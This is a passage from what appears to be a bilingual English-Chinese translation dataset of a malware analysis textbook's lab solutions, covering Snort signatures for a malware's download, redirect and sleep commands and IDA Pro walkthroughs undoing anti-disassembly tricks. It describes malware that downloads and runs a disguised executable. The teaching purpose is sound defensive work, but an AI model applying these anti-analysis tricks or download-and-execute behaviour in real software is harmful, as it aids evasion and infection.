  zh: .NET|20|CLR|20|3.0.4506.2152\;|20|.NET|20|CLR|20|3.5.30729)"; http_header; sid:20001431;
    rev:1;)
- en: Solutions to Labs
  id: totrans-5094
  prefs: []
  type: TYPE_NORMAL
  zh: 实验室解决方案
- en: '**643**'
  id: totrans-5095
  prefs: []
  type: TYPE_NORMAL
  zh: '**643**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-5096
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '**Web Commands**'
  id: totrans-5097
  prefs: []
  type: TYPE_NORMAL
  zh: '**Web 命令**'
- en: 'The overall picture of the command provided by the web page is the following:'
  id: totrans-5098
  prefs: []
  type: TYPE_NORMAL
  zh: 网页提供的命令的整体图景如下：
- en: <noscript>... *truncated_url*/ *cmd_char*.../ *arg* 96'
  id: totrans-5099
  prefs: []
  type: TYPE_NORMAL
  zh: <noscript>... *truncated_url*/ *cmd_char*.../ *arg* 96'
- en: 'The malware searches for several static elements in the web page, including
    the noscript tag, the first characters of the URL ( *http://*), and the trailing
    96''. Since the parsing function that reads the *cmd_char* structure is in a different
    area of the code and may be changed independently, it should be targeted separately.
    Thus, the following is the signature for targeting just the static elements expected
    by the malware:'
  id: totrans-5100
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件在网页中搜索几个静态元素，包括 noscript 标签、URL 的前缀字符（*http://*）和尾随的 96'。由于读取 *cmd_char*
    结构的解析函数位于代码的不同区域，并且可能独立更改，因此应单独针对它。因此，以下是为针对恶意软件期望的静态元素而设计的签名：
- en: alert tcp $EXTERNAL_NET $HTTP_PORTS -> $HOME_NET any (msg:"PM14.3.2 Noscript
    tag with ending"; content:"<noscript>"; content:"http\://"; distance:0; within:512;
    content:"96'"; distance:0; within:512; sid:20001432; rev:1;) The other section
    of code to target is the command processing. The commands accepted by the malware
    are listed in Table 14-2L.
  id: totrans-5101
  prefs: []
  type: TYPE_NORMAL
  zh: alert tcp $EXTERNAL_NET $HTTP_PORTS -> $HOME_NET any (msg:"PM14.3.2 结尾的 noscript
    标签"; content:"<noscript>"; content:"http\://"; distance:0; within:512; content:"96'";
    distance:0; within:512; sid:20001432; rev:1;) 要针对的另一段代码是命令处理。恶意软件接受的命令列在表 14-2L
    中。
- en: '**Table 14-2L:** Malware Commands'
  id: totrans-5102
  prefs: []
  type: TYPE_NORMAL
  zh: '**表 14-2L:** 恶意软件命令'
- en: '**Name**'
  id: totrans-5103
  prefs: []
  type: TYPE_NORMAL
  zh: '**名称**'
- en: '**Command**'
  id: totrans-5104
  prefs: []
  type: TYPE_NORMAL
  zh: '**命令**'
- en: '**Argument**'
  id: totrans-5105
  prefs: []
  type: TYPE_NORMAL
  zh: '**参数**'
- en: download
  id: totrans-5106
  prefs: []
  type: TYPE_NORMAL
  zh: download
- en: d
  id: totrans-5107
  prefs: []
  type: TYPE_NORMAL
  zh: d
- en: Encoded URL
  id: totrans-5108
  prefs: []
  type: TYPE_NORMAL
  zh: 编码的 URL
- en: quit
  id: totrans-5109
  prefs: []
  type: TYPE_NORMAL
  zh: quit
- en: n
  id: totrans-5110
  prefs: []
  type: TYPE_NORMAL
  zh: n
- en: NA
  id: totrans-5111
  prefs: []
  type: TYPE_NORMAL
  zh: NA
- en: redirect
  id: totrans-5112
  prefs: []
  type: TYPE_NORMAL
  zh: redirect
- en: r
  id: totrans-5113
  prefs: []
  type: TYPE_NORMAL
  zh: r
- en: Encoded URL
  id: totrans-5114
  prefs: []
  type: TYPE_NORMAL
  zh: 编码的 URL
- en: sleep
  id: totrans-5115
  prefs: []
  type: TYPE_NORMAL
  zh: sleep
- en: s
  id: totrans-5116
  prefs: []
  type: TYPE_NORMAL
  zh: s
- en: Number of seconds
  id: totrans-5117
  prefs: []
  type: TYPE_NORMAL
  zh: 秒数
- en: 'The download and redirect functions both share the same routine to decode the
    URL (as shown in Figure 14-5L), so we will target these two commands together:'
  id: totrans-5118
  prefs: []
  type: TYPE_NORMAL
  zh: 下载和重定向功能都使用相同的例程来解码 URL（如图 14-5L 所示），因此我们将同时针对这两个命令：
- en: alert tcp $EXTERNAL_NET $HTTP_PORTS -> $HOME_NET any (msg:"PM14.3.3 Download
    or Redirect Command"; content:"/08202016370000"; pcre:"/\/[dr][^\/]*\/
  id: totrans-5119
  prefs: []
  type: TYPE_NORMAL
  zh: alert tcp $EXTERNAL_NET $HTTP_PORTS -> $HOME_NET any (msg:"PM14.3.3 下载或重定向命令";
    content:"/08202016370000"; pcre:"/\/[dr][^\/]*\/
- en: 08202016370000/"; sid:20001433; rev:1;)
  id: totrans-5120
  prefs: []
  type: TYPE_NORMAL
  zh: 08202016370000/"; sid:20001433; rev:1;)
- en: This signature uses the string 08202016370000, which we previously identified
    as the encoded representation of *http://*. The PCRE rule option includes this
    string and forward slashes, and the d and r that indicate the download and redirect
    commands. The \/ is an escaped forward slash, the [dr] represents either the character
    d or r, the [^\/]* matches zero or more characters that are not a forward slash,
    and the \/ is another escaped slash.
  id: totrans-5121
  prefs: []
  type: TYPE_NORMAL
  zh: 此签名使用字符串08202016370000，我们之前已将其识别为*http://*的编码表示。PCRE规则选项包括此字符串和正斜杠，以及表示下载和重定向命令的d和r。\/是一个转义的正斜杠，[dr]代表字符d或r，[^\/]*匹配零个或多个不是正斜杠的字符，\/是另一个转义的斜杠。
- en: 'The quit command by itself only has one known character, which is insufficient
    to target by itself. Thus, the last command we need to target is sleep, which
    can be detected with the following signature: alert tcp $EXTERNAL_NET $HTTP_PORTS
    -> $HOME_NET any (msg:"PM14.3.4 Sleep Command"; content:"96''"; pcre:"/\/s[^\/]{0,15}\/[0-9]{2,20}96''/";
    sid:20001434; rev:1;)'
  id: totrans-5122
  prefs: []
  type: TYPE_NORMAL
  zh: 单独的退出命令只有一个已知的字符，这不足以单独定位。因此，我们需要定位的最后一个命令是sleep，可以使用以下签名检测：alert tcp $EXTERNAL_NET
    $HTTP_PORTS -> $HOME_NET any (msg:"PM14.3.4 Sleep Command"; content:"96'"; pcre:"/\/s[^\/]{0,15}\/[0-9]{2,20}96'/";
    sid:20001434; rev:1;)
- en: '**644**'
  id: totrans-5123
  prefs: []
  type: TYPE_NORMAL
  zh: '**644**'
- en: Appendix C
  id: totrans-5124
  prefs: []
  type: TYPE_NORMAL
  zh: 附录C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-5125
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: Since there is no fixed content expression target to provide sufficient processing
    performance, we will use one element from outside the command string itself (the
    96') to achieve an efficient signature. The PCRE identifies the forward slash
    followed by an s, then between 0 and 15 characters that are not a forward slash
    ('[^\/]{0,15}), a forward slash, and then between 2 and 20 digits plus a trailing
    96'.
  id: totrans-5126
  prefs: []
  type: TYPE_NORMAL
  zh: 由于没有固定的内容表达式目标来提供足够的处理性能，我们将使用命令字符串本身之外的一个元素（96'）来实现一个高效的签名。PCRE识别紧跟在s后面的正斜杠，然后是0到15个不是正斜杠的字符（'[^\/]{0,15}'），一个正斜杠，然后是2到20个数字加上一个尾随的96'。
- en: Note that the upper and lower bounds on the number of characters that will match
    the regular expression are not being driven by what the malware will accept. Rather,
    they are determined by a trade-off between what is reasonably expected from an
    attacker and the costs associated with an unbounded regular expression. So while
    the malware may indeed be able to accept a sleep value of more than 20 digits,
    it is doubtful that the attacker would send such a value, since that translates
    to more than 3 tril-lion years. The 15 characters for the term starting with an
    s assumes that the attacker would continue to choose a single word starting with
    s, though this value can certainly be increased if a more foolproof signature
    is needed.
  id: totrans-5127
  prefs: []
  type: TYPE_NORMAL
  zh: 注意，匹配正则表达式的字符数上下限不是由恶意软件所能接受的来驱动的。相反，它们是由攻击者合理期望的成本与无界正则表达式相关的成本之间的权衡所决定的。因此，尽管恶意软件确实能够接受超过20位的睡眠值，但攻击者发送这样的值是值得怀疑的，因为这相当于超过3000亿年。对于以s开头的术语的15个字符假设攻击者会继续选择以s开头的单个单词，尽管如果需要更可靠的签名，这个值当然可以增加。
- en: '**Lab 15-1 Solutions**'
  id: totrans-5128
  prefs: []
  type: TYPE_NORMAL
  zh: '**实验15-1解答**'
- en: '***Short Answers***'
  id: totrans-5129
  prefs: []
  type: TYPE_NORMAL
  zh: '***简答***'
- en: 1\.
  id: totrans-5130
  prefs: []
  type: TYPE_NORMAL
  zh: 1\.
- en: 'This program uses false conditional branches: an xor eax, eax, followed by
    jz.'
  id: totrans-5131
  prefs: []
  type: TYPE_NORMAL
  zh: 此程序使用假条件分支：xor eax, eax后跟jz。
- en: 2\.
  id: totrans-5132
  prefs: []
  type: TYPE_NORMAL
  zh: 2\.
- en: The program tricks the disassembler into disassembling the opcode 0xE8, the
    first of a 5-byte call instruction, which immediately follows the jz instruction.
  id: totrans-5133
  prefs: []
  type: TYPE_NORMAL
  zh: 程序欺骗反汇编器将操作码0xE8（5字节调用指令的第一个字节）反汇编，该指令紧跟在jz指令之后。
- en: 3\.
  id: totrans-5134
  prefs: []
  type: TYPE_NORMAL
  zh: 3\.
- en: The false conditional branch technique is used five times in this program.
  id: totrans-5135
  prefs: []
  type: TYPE_NORMAL
  zh: 此程序中使用了五次假条件分支技术。
- en: 4\.
  id: totrans-5136
  prefs: []
  type: TYPE_NORMAL
  zh: 4\.
- en: The command-line argument pdq will cause the program to print
  id: totrans-5137
  prefs: []
  type: TYPE_NORMAL
  zh: 命令行参数pdq将导致程序打印
- en: “Good Job!”
  id: totrans-5138
  prefs: []
  type: TYPE_NORMAL
  zh: “做得好！”
- en: '**1 5**'
  id: totrans-5139
  prefs: []
  type: TYPE_NORMAL
  zh: '**1 5**'
- en: '***Detailed Analysis***'
  id: totrans-5140
  prefs: []
  type: TYPE_NORMAL
  zh: '***详细分析***'
- en: First, we load the file into IDA Pro and scroll to the main function at address
    0x401000\. A few lines from the start of the function, memory address 0x0040100E,
    we see the first signs of anti-disassembly, as shown in Listing 15-1L.
  id: totrans-5141
  prefs: []
  type: TYPE_NORMAL
  zh: 首先，我们将文件加载到IDA Pro中，并滚动到地址0x401000的主函数。在函数开始处几行之后，内存地址0x0040100E，我们看到反汇编的第一个迹象，如列表15-1L所示。
- en: 00401006 83 7D 08 02 cmp dword ptr [ebp+8], 2
  id: totrans-5142
  prefs: []
  type: TYPE_NORMAL
  zh: 00401006 83 7D 08 02 cmp dword ptr [ebp+8], 2
- en: 0040100A 75 52 jnz short loc_40105E
  id: totrans-5143
  prefs: []
  type: TYPE_NORMAL
  zh: 0040100A 75 52 jnz short loc_40105E
- en: 0040100C 33 C0 xor eax, eax
  id: totrans-5144
  prefs: []
  type: TYPE_NORMAL
  zh: 0040100C 33 C0 xor eax, eax
- en: 0040100E 74 01 jz short near ptr loc_401010+1 
  id: totrans-5145
  prefs: []
  type: TYPE_NORMAL
  zh: 0040100E 74 01 jz short near ptr loc_401010+1 
- en: '00401010'
  id: totrans-5146
  prefs: []
  type: TYPE_NORMAL
  zh: '00401010'
- en: '00401010 loc_401010: ; CODE XREF:0040100Ej 00401010 E8 8B 45 0C 8B'
  id: totrans-5147
  prefs: []
  type: TYPE_NORMAL
  zh: '00401010 loc_401010: ; CODE XREF:0040100Ej 00401010 E8 8B 45 0C 8B'
- en: call near ptr 8B4C55A0h
  id: totrans-5148
  prefs: []
  type: TYPE_NORMAL
  zh: call near ptr 8B4C55A0h
- en: '*Listing 15-1L: jz jumping into the middle of a call instruction* As shown
    at , the jz instruction appears to be jumping into the middle of the 5-byte call
    instruction at . We must determine whether this branch will be executed.'
  id: totrans-5149
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表15-1L：jz跳入调用指令的中间* 如所示，jz指令似乎跳入了处的5字节调用指令的中间。我们必须确定这个分支是否会执行。'
- en: Solutions to Labs
  id: totrans-5150
  prefs: []
  type: TYPE_NORMAL
  zh: 实验解答
- en: '**645**'
  id: totrans-5151
  prefs: []
  type: TYPE_NORMAL
  zh: '**645**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-5152
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: The instruction immediately preceding this branch is xor eax, eax, which will
    always set the EAX register to zero, and thus always result in the zero flag being
    set. The jz instruction will therefore always jump at this point because the state
    of the zero flag is always known. We must alter the disassembly to show the real
    target of this jump instead of the fake call instruction that is overlapping it.
  id: totrans-5153
  prefs: []
  type: TYPE_NORMAL
  zh: 在此分支之前的指令是xor eax, eax，这将始终将EAX寄存器设置为0，因此始终导致零标志被设置。因此，jz指令将始终在此点跳转，因为零标志的状态始终是已知的。我们必须修改反汇编，以显示跳转的真实目标，而不是与之重叠的假调用指令。
- en: Position your cursor on line 0x00401010 and press the D key on your keyboard
    to turn the line into data, as shown in Listing 15-2L. Notice that the CODE XREF
    comment is no longer red but green, and the target of the jz instruction is no
    longer loc_401010+1 but unk_401011, as seen at .
  id: totrans-5154
  prefs: []
  type: TYPE_NORMAL
  zh: 将光标放在0x00401010行，然后按键盘上的D键将行转换为数据，如列表15-2L所示。注意，CODE XREF注释不再为红色，而是绿色，jz指令的目标也不再是loc_401010+1，而是unk_401011，如所示。
- en: 0040100E 74 01 jz short near ptr unk_401011 
  id: totrans-5155
  prefs: []
  type: TYPE_NORMAL
  zh: 0040100E 74 01 jz short near ptr unk_401011 
- en: 0040100E ; --------------------------------------------------------------
  id: totrans-5156
  prefs: []
  type: TYPE_NORMAL
  zh: 0040100E ; --------------------------------------------------------------
- en: 00401010 E8 db 0E8h
  id: totrans-5157
  prefs: []
  type: TYPE_NORMAL
  zh: 00401010 E8 db 0E8h
- en: 00401011 8B  unk_401011
  id: totrans-5158
  prefs: []
  type: TYPE_NORMAL
  zh: 00401011 8B  unk_401011
- en: 'db 8Bh ; ï ; CODE XREF: 0040100Ej'
  id: totrans-5159
  prefs: []
  type: TYPE_NORMAL
  zh: 'db 8Bh ; ï ; CODE XREF: 0040100Ej'
- en: '*Listing 15-2L: Converting the call instruction from Listing 15-1L to data*
    We can now modify the real target of the jz instruction. To do so, place your
    cursor at  and press the C key on your keyboard to turn this piece of data into
    code. The instructions immediately following the listing may be out of alignment,
    so keep pressing C on each db line that follows until each instruction is followed
    immediately by another instruction with no data bytes in between.'
  id: totrans-5160
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表15-2L：将列表15-1L中的调用指令转换为数据* 我们现在可以修改jz指令的真实目标。要做到这一点，将光标放在处，然后按键盘上的C键将此数据转换为代码。列表后面的指令可能对齐不当，所以继续在每个db行后按C键，直到每个指令后面紧跟着另一个指令，中间没有数据字节。'
- en: The same false conditional technique is found again at offset 0x0040101F.
  id: totrans-5161
  prefs: []
  type: TYPE_NORMAL
  zh: 在偏移量0x0040101F处再次发现了相同的错误条件技术。
- en: Clean up the code at this location in the same manner to reveal another use
    of the false conditional technique at location 0x00401033\. The final remaining
    places to fix are 0x00401047 and 0x0040105E.
  id: totrans-5162
  prefs: []
  type: TYPE_NORMAL
  zh: 以相同的方式清理此位置的代码，以揭示在0x00401033处使用错误条件技术的另一个例子。最后需要修复的地方是0x00401047和0x0040105E。
- en: Once all the code is disassembled correctly, select the code from line 0x00401000
    to the retn instruction at line 0x00401077, and press the P key on your keyboard
    to force IDA Pro to turn this block of code into a function.
  id: totrans-5163
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦所有代码正确反汇编，从0x00401000行到0x00401077行的retn指令选择代码，然后按键盘上的P键强制IDA Pro将此代码块转换为函数。
- en: Once it is a function, rename the function parameters argc and argv. At this
    point, it should be clear at line 0x00401006 that the program checks to see if
    the value of argc is 2, and prints the failure string if it is not. If the value
    is 2, line 0x0040101A compares the first letter of argv[1] with p. Line 0x0040102E
  id: totrans-5164
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦它成为一个函数，将函数参数重命名为argc和argv。此时，在0x00401006行应该清楚，程序检查argc的值是否为2，如果不是，则打印失败字符串。如果值为2，0x0040101A行将argv[1]的第一个字母与p进行比较。0x0040102E行
- en: then compares the third letter with q, and 0x00401042 compares the second with
    d. If all three letters are equal, the string Good Job! is printed at line 0x00401051\.
  id: totrans-5165
  prefs: []
  type: TYPE_NORMAL
  zh: 然后比较第三个字母与q，0x00401042行比较第二个字母与d。如果这三个字母都相等，则在0x00401051行打印字符串Good Job!。
- en: '**Lab 15-2 Solutions**'
  id: totrans-5166
  prefs: []
  type: TYPE_NORMAL
  zh: '**实验15-2解答**'
- en: '***Short Answers***'
  id: totrans-5167
  prefs: []
  type: TYPE_NORMAL
  zh: '***简短回答***'
- en: 1\.
  id: totrans-5168
  prefs: []
  type: TYPE_NORMAL
  zh: '1.'
- en: The URL initially requested is *http://www.practicalmalwareanalysis.com/*
  id: totrans-5169
  prefs: []
  type: TYPE_NORMAL
  zh: 初始请求的URL是*http://www.practicalmalwareanalysis.com/*
- en: '*bamboo.html*.'
  id: totrans-5170
  prefs: []
  type: TYPE_NORMAL
  zh: '*bamboo.html*.'
- en: 2\.
  id: totrans-5171
  prefs: []
  type: TYPE_NORMAL
  zh: '2.'
- en: The User-Agent string is generated by adding 1 to each letter and number in
    the hostname ( *Z* and 9 are rotated to *A* and 0).
  id: totrans-5172
  prefs: []
  type: TYPE_NORMAL
  zh: 用户代理字符串是通过将主机名（*Z*和9旋转到*A*和0）中的每个字母和数字加1生成的。
- en: 3\.
  id: totrans-5173
  prefs: []
  type: TYPE_NORMAL
  zh: '3.'
- en: 'The program looks for the string Bamboo:: in the page it requested.'
  id: totrans-5174
  prefs: []
  type: TYPE_NORMAL
  zh: 程序在其请求的页面中寻找字符串Bamboo::。
- en: '**646**'
  id: totrans-5175
  prefs: []
  type: TYPE_NORMAL
  zh: '**646**'
- en: Appendix C
  id: totrans-5176
  prefs: []
  type: TYPE_NORMAL
  zh: 附录C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-5177
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: 4\.
  id: totrans-5178
  prefs: []
  type: TYPE_NORMAL
  zh: '4.'
- en: 'The program searches beyond the Bamboo:: string to find an additional ::, which
    it converts to a NULL terminator. The string in between Bamboo and the terminator
    is downloaded to a file named *Account Summary.xls.exe* and executed.'
  id: totrans-5179
  prefs: []
  type: TYPE_NORMAL
  zh: 程序在Bamboo::字符串之后搜索以找到额外的::，并将其转换为空终止符。在Bamboo和终止符之间的字符串被下载到名为*Account Summary.xls.exe*的文件中并执行。
- en: '***Detailed Analysis***'
  id: totrans-5180
  prefs: []
  type: TYPE_NORMAL
  zh: '**详细分析**'
- en: Open the binary with IDA Pro and scroll to the main function at offset 0x00401000\.
    We will begin with disarming this function by reading it top to bottom, fixing
    each countermeasure until we reach the logical end of the function. The first
    countermeasure we encounter is shown in Listing 15-3L
  id: totrans-5181
  prefs: []
  type: TYPE_NORMAL
  zh: 使用IDA Pro打开二进制文件，并滚动到偏移量为0x00401000的主函数。我们将从自顶向下读取该函数，修复每个对策，直到达到函数的逻辑结束。我们遇到的第一项对策如列表15-3L所示。
- en: at address 0x0040115A.
  id: totrans-5182
  prefs: []
  type: TYPE_NORMAL
  zh: 在地址0x0040115A。
- en: 0040115A test esp, esp
  id: totrans-5183
  prefs: []
  type: TYPE_NORMAL
  zh: 0040115A test esp, esp
- en: 0040115C jnz short near ptr loc_40115E+1 
  id: totrans-5184
  prefs: []
  type: TYPE_NORMAL
  zh: 0040115C jnz short near ptr loc_40115E+1 
- en: 0040115E
  id: totrans-5185
  prefs: []
  type: TYPE_NORMAL
  zh: 0040115E
- en: '0040115E loc_40115E: ; CODE XREF: 0040115Cj 0040115E jmp near ptr 0AA11CDh
    '
  id: totrans-5186
  prefs: []
  type: TYPE_NORMAL
  zh: '0040115E loc_40115E: ; CODE XREF: 0040115Cj 0040115E jmp near ptr 0AA11CDh
    '
- en: 0040115E ; ----------------------------------------------------------------------
  id: totrans-5187
  prefs: []
  type: TYPE_NORMAL
  zh: 0040115E ; ----------------------------------------------------------------------
- en: 00401163 db 6Ah
  id: totrans-5188
  prefs: []
  type: TYPE_NORMAL
  zh: 00401163 db 6Ah
- en: '00401164 dd 0E8006A00h, 21Ah, 5C858B50h, 50FFFEFDh, 206415FFh, 85890040h 00401164
    dd 0FFFFFD64h, 0FD64BD83h, 7400FFFFh, 0FC8D8D24h, 51FFFFFEh *Listing 15-3L: False
    conditional*'
  id: totrans-5189
  prefs: []
  type: TYPE_NORMAL
  zh: 00401164 dd 0E8006A00h, 21Ah, 5C858B50h, 50FFFEFDh, 206415FFh, 85890040h 00401164
    dd 0FFFFFD64h, 0FD64BD83h, 7400FFFFh, 0FC8D8D24h, 51FFFFFEh *列表15-3L：假条件*
- en: The listing shows a false conditional used by the jnz instruction at .
  id: totrans-5190
  prefs: []
  type: TYPE_NORMAL
  zh: 列表显示了在处使用的jnz指令的假条件。
- en: The jump will always be taken because the value of ESP will always be nonzero
    at this point in the program. The ESP register is never loaded with a specific
    value, but it must be nonzero for a normal functioning Win32 application.
  id: totrans-5191
  prefs: []
  type: TYPE_NORMAL
  zh: 由于ESP的值在此程序的这个点始终不为零，因此跳转总是会被执行。ESP寄存器永远不会加载特定的值，但为了正常工作的Win32应用程序，它必须不为零。
- en: The target of the jump lies within the 5-byte jmp instruction at . Turn this
    instruction into data by putting your cursor at  and pressing D on the keyboard.
    Then put your cursor on the jump target line 0x0040115F and **1 5**
  id: totrans-5192
  prefs: []
  type: TYPE_NORMAL
  zh: 跳转的目标位于处的5字节跳转指令内。将光标置于并按键盘上的D键，将此指令转换为数据。然后将光标移至跳转目标行0x0040115F和**1 5**
- en: press C to turn the line into code.
  id: totrans-5193
  prefs: []
  type: TYPE_NORMAL
  zh: 按C键将行转换为代码。
- en: We continue reading the code until we encounter the anti-disassembly countermeasure
    at line 0x004011D0\. This is a simple false conditional based on a jz following
    an xor eax, eax instruction. Correct this disassembly in the same fashion as in
    Lab 15-1\. Be sure to continue turning bytes into code so it reads clearly. Continue
    reading the code until you come to the next countermeasure at line 0x00401215,
    which is shown in Listing 15-4L.
  id: totrans-5194
  prefs: []
  type: TYPE_NORMAL
  zh: 我们继续阅读代码，直到遇到行0x004011D0处的反汇编对策。这是一个基于xor eax, eax指令后的jz的简单假条件。以与Lab 15-1中相同的方式更正此反汇编。务必继续将字节转换为代码，以便它清晰可读。继续阅读代码，直到到达行0x00401215处的下一个对策，如列表15-4L所示。
- en: '00401215 loc_401215: ; CODE XREF: loc_401215j 00401215 EB FF  jmp short near
    ptr loc_401215+1'
  id: totrans-5195
  prefs: []
  type: TYPE_NORMAL
  zh: '00401215 loc_401215: ; CODE XREF: loc_401215j 00401215 EB FF  jmp short near
    ptr loc_401215+1'
- en: '*Listing 15-4L: jmp into itself*'
  id: totrans-5196
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表15-4L：自跳转*'
- en: At  is a 2-byte jmp instruction whose target is the second byte of itself.
  id: totrans-5197
  prefs: []
  type: TYPE_NORMAL
  zh: 在地址处有一个2字节跳转指令，其目标是指令自身的第二个字节。
- en: The second byte is the first byte of the next instruction. Turn this instruction
    into data and put your cursor on the second byte, location 0x00401216, and turn
    it into code. To force IDA Pro to produce a clean graph, turn the first byte of
    the jmp instruction (0xEB) into a NOP. If you are using the commercial Solutions
    to Labs
  id: totrans-5198
  prefs: []
  type: TYPE_NORMAL
  zh: 第二个字节是下一条指令的第一个字节。将此指令转换为数据，并将光标移至第二个字节，位置0x00401216，并将其转换为代码。为了使IDA Pro生成干净的图形，将跳转指令的第一个字节（0xEB）转换为NOP。如果您使用的是商业解决方案
- en: '**647**'
  id: totrans-5199
  prefs: []
  type: TYPE_NORMAL
  zh: '**647**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-5200
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: version of IDA Pro, select **File****Python command**, enter **PatchByte(0x401215,**
    **0x90)** into the text box, and click **OK**. Now put your cursor on the location
    0x00401215, which should contain the value db 90h, and convert it to code by pressing
    the C key.
  id: totrans-5201
  prefs: []
  type: TYPE_NORMAL
  zh: IDA Pro的版本，选择**文件****Python命令**，在文本框中输入**PatchByte(0x401215,** **0x90)**，然后点击**确定**。现在将光标移至地址0x00401215，该位置应包含值db
    90h，并通过按C键将其转换为代码。
- en: Continue reading the code until you reach the next countermeasure at line 0x00401269,
    which is shown in Listing 15-5L.
  id: totrans-5202
  prefs: []
  type: TYPE_NORMAL
  zh: 继续阅读代码，直到你到达行号0x00401269的下一个对策，它显示在列表15-5L中。
- en: 00401269 jz short near ptr loc_40126D+1 
  id: totrans-5203
  prefs: []
  type: TYPE_NORMAL
  zh: 00401269 jz short near ptr loc_40126D+1 
- en: 0040126B jnz short near ptr loc_40126D+1 
  id: totrans-5204
  prefs: []
  type: TYPE_NORMAL
  zh: 0040126B jnz short near ptr loc_40126D+1 
- en: 0040126D
  id: totrans-5205
  prefs: []
  type: TYPE_NORMAL
  zh: 0040126D
- en: '0040126D loc_40126D: ; CODE XREF: 00401269j 0040126D ; 0040126Bj 0040126D call
    near ptr 0FF3C9FFFh '
  id: totrans-5206
  prefs: []
  type: TYPE_NORMAL
  zh: '0040126D loc_40126D: ; CODE XREF: 00401269j 0040126D ; 0040126Bj 0040126D call
    near ptr 0FF3C9FFFh '
- en: '*Listing 15-5L: False conditionals with the same target* Listing 15-5L shows
    a false conditional based on putting both halves of a conditional branch back-to-back
    ( and ) and pointing at the same target.'
  id: totrans-5207
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表15-5L：具有相同目标的假条件* 列表15-5L显示了一种基于将条件分支的两部分放在一起（和）并指向相同目标的假条件。'
- en: The same target for jnz and jz means that the countermeasure does not depend
    on a specific state of the zero flag as either set or unset in order to hit the
    target code. In this case, the target is in the middle of the call instruction
    on line 0x0040126D at . Convert this instruction to data by pressing the D
  id: totrans-5208
  prefs: []
  type: TYPE_NORMAL
  zh: jnz和jz的目标相同意味着对策不依赖于零标志的特定状态，无论是设置还是清除，以便达到目标代码。在这种情况下，目标位于行号0x0040126D的调用指令中间在处。通过按D键将此指令转换为数据。
- en: key on the keyboard. Then put your cursor on line 0x0040126E to convert it to
    code with the C key.
  id: totrans-5209
  prefs: []
  type: TYPE_NORMAL
  zh: 在键盘上按键。然后将光标放在行号0x0040126E上，使用C键将其转换为代码。
- en: Continue reading the code until you reach the next countermeasure at line 0x004012E6,
    which is shown in Listing 15-6L.
  id: totrans-5210
  prefs: []
  type: TYPE_NORMAL
  zh: 继续阅读代码，直到你到达行号0x004012E6的下一个对策，它显示在列表15-6L中。
- en: '004012E6 loc_4012E6: ; CODE XREF: 004012ECj 004012E6 66 B8 EB 05 mov ax, 5EBh
    '
  id: totrans-5211
  prefs: []
  type: TYPE_NORMAL
  zh: '004012E6 loc_4012E6: ; CODE XREF: 004012ECj 004012E6 66 B8 EB 05 mov ax, 5EBh
    '
- en: 004012EA 31 C0 xor eax, eax 004012EC 74 FA jz short near ptr loc_4012E6+2 
  id: totrans-5212
  prefs: []
  type: TYPE_NORMAL
  zh: 004012EA 31 C0 xor eax, eax 004012EC 74 FA jz short near ptr loc_4012E6+2 
- en: '004012EE E8 6A 0A 6A 00 call near ptr 0AA1D5Dh *Listing 15-6L: False conditionals
    into the middle of the previous instruction* Listing 15-6L shows an advanced countermeasure
    that involves a false conditional jump into the middle of a previous instruction
    as seen with the upward-jumping jz at . This jumps into the middle of the mov
    instruction at .'
  id: totrans-5213
  prefs: []
  type: TYPE_NORMAL
  zh: 004012EE E8 6A 0A 6A 00 call near ptr 0AA1D5Dh *列表15-6L：将假条件跳转插入到前一条指令的中间* 列表15-6L显示了一种高级对策，涉及将假条件跳转插入到前一条指令的中间，如处的向上跳转jz所示。这跳转到处的mov指令的中间。
- en: It is impossible to have the disassembler show all the instructions that are
    executed in this case because the opcodes are used twice, so just follow the code
    logically and convert each instruction to code as you reach it.
  id: totrans-5214
  prefs: []
  type: TYPE_NORMAL
  zh: 在这种情况下，反汇编器无法显示所有执行的指令，因为操作码被使用了两次，所以只需逻辑地跟随代码，并在到达时将每个指令转换为代码。
- en: When you are finished with this countermeasure, it should look like the code
    in Listing 15-7L. At , we see the middle of the mov instruction from the previous
    listing converted to a proper jmp instruction.
  id: totrans-5215
  prefs: []
  type: TYPE_NORMAL
  zh: 完成此对策后，它应该看起来像列表15-7L中的代码。在处，我们看到从上一列表中的mov指令中间转换为一个合适的jmp指令。
- en: 004012E6 66 db 66h
  id: totrans-5216
  prefs: []
  type: TYPE_NORMAL
  zh: 004012E6 66 db 66h
- en: 004012E7 B8 db 0B8h ; +
  id: totrans-5217
  prefs: []
  type: TYPE_NORMAL
  zh: 004012E7 B8 db 0B8h ; +
- en: 004012E8 ; ------------------------------------------------------------
  id: totrans-5218
  prefs: []
  type: TYPE_NORMAL
  zh: 004012E8 ; ------------------------------------------------------------
- en: 004012E8
  id: totrans-5219
  prefs: []
  type: TYPE_NORMAL
  zh: 004012E8
- en: '004012E8 loc_4012E8: ; CODE XREF: 004012ECj **648**'
  id: totrans-5220
  prefs: []
  type: TYPE_NORMAL
  zh: '004012E8 loc_4012E8: ; CODE XREF: 004012ECj **648**'
- en: Appendix C
  id: totrans-5221
  prefs: []
  type: TYPE_NORMAL
  zh: 附录C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-5222
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: 004012E8 EB 05 jmp short loc_4012EF 
  id: totrans-5223
  prefs: []
  type: TYPE_NORMAL
